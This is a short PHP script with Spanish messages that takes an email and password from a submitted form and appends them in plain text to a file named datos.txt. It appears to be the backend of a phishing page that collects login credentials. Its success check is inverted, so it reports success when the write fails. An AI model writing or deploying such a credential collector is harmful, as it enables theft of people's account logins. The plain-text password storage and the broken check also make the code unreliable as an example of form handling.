<?php
    $email = $_POST["email"];
    $pass = $_POST["pass"];
    
    $contenido = "email: $email, contraseña: $pass.\n";
    $archivo = "datos.txt";
    
    if (file_put_contents($archivo, $contenido, FILE_APPEND) == false) {
        echo "Los datos han sido guardados correctamente.";
    } else {
        echo "Error al guardar los datos.";
    }
